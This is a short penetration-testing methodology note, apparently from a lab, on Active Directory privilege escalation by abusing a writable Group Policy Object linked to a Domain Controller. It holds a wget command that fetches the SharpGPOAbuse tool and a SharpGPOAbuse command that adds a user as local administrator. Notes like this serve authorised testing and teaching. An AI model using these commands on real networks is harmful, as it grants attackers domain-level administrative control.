### Abusing GPO: <https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0>
wget <https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe>

<https://youtu.be/pmaeQlFkFV0?t=1198>

In this example our compromised user can write to DCPOLICY@SPRAY.CSL, which then has a GPLink to the Domain Controller. This can be abused with SharpGPOAbuse.exe for example:

SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
![unnamed_7dd933fac0d045de8d32be5857c54180](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Active%20Directory%20Methdology/Attacks/GPO%20Abuse/{{notename}}-202605011742.png)
